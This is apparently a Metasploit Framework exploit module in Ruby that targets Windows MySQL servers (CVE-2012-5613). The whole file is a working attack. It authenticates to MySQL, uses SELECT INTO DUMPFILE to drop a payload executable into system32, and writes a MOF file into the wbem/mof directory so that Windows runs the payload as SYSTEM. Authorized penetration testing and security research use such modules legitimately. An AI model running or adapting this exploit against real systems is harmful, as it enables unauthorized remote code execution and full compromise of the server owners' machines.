##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::MYSQL
	include Msf::Exploit::WbemExec
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle MySQL for Microsoft Windows MOF Execution',
			'Description'    => %q{
					This modules takes advantage of a file privilege misconfiguration problem
				specifically against Windows MySQL servers (due to the use of a .mof file).
				This may result in arbitrary code execution under the context of SYSTEM. However,
				please note in order to use this module, you must have a valid MySQL account on
				the target machine.
			},
			'Author'         =>
				[
					'kingcope',
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2012-5613'], #DISPUTED
					['EDB', '23083'],
					['URL', 'http://seclists.org/fulldisclosure/2012/Dec/13']
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'MySQL on Windows', { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 01 2012'
		))

		register_options(
			[
				OptString.new('USERNAME', [ true, 'The username to authenticate as']),
				OptString.new('PASSWORD', [ true, 'The password to authenticate with'])
			])
	end

	def check
		begin
			m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
		rescue RbMysql::AccessDeniedError
			print_error("#{peer} - Access denied.")
			return Exploit::CheckCode::Safe
		end

		return Exploit::CheckCode::Appears if is_windows?
		return Exploit::CheckCode::Safe
	end

	def peer
		"#{rhost}:#{rport}"
	end

	def query(q)
		rows = []

		begin
			res = mysql_query(q)
			return rows if not res
			res.each_hash do |row|
				rows << row
			end
		rescue RbMysql::ParseError
			return rows
		end

		return rows
	end

	def is_windows?
		r = query("SELECT @@version_compile_os;")
		return (r[0]['@@version_compile_os'] =~ /^Win/) ? true : false
	end

	def get_drive_letter
		r = query("SELECT @@tmpdir;")
		drive = r[0]['@@tmpdir'].scan(/^(\w):/).flatten[0] || ''
		return drive
	end

	def upload_file(bin, dest)
		p = bin.unpack("H*")[0]
		query("SELECT 0x#{p} into DUMPFILE '#{dest}'")
	end

	def exploit
		print_status("#{peer} - Attempting to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'")
		begin
			m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
			return if not m
		rescue RbMysql::AccessDeniedError
			print_error("#{peer} - Access denied.")
			return
		end

		if not is_windows?
			print_error("#{peer} - Remote host isn't Windows.")
			return
		end

		drive    = get_drive_letter
		exe_name = Rex::Text::rand_text_alpha(5) + ".exe"
		dest     = "#{drive}:/windows/system32/#{exe_name}"
		exe      = generate_payload_exe
		print_status("#{peer} - Uploading to '#{dest}'")
		begin
			upload_file(exe, dest)
			register_file_for_cleanup("#{exe_name}")
		rescue RbMysql::AccessDeniedError
			print_error("#{peer} - No permission to write. I blame kc :-)")
			return
		end

		mof_name = Rex::Text::rand_text_alpha(5) + ".mof"
		dest     = "#{drive}:/windows/system32/wbem/mof/#{mof_name}"
		mof      = generate_mof(mof_name, exe_name)
		print_status("#{peer} - Uploading to '#{dest}'")
		begin
			upload_file(mof, dest)
			register_file_for_cleanup("wbem\\mof\\good\\#{mof_name}")
		rescue RbMysql::AccessDeniedError
			print_error("#{peer} - No permission to write. Bail!")
			return
		end
	end

end
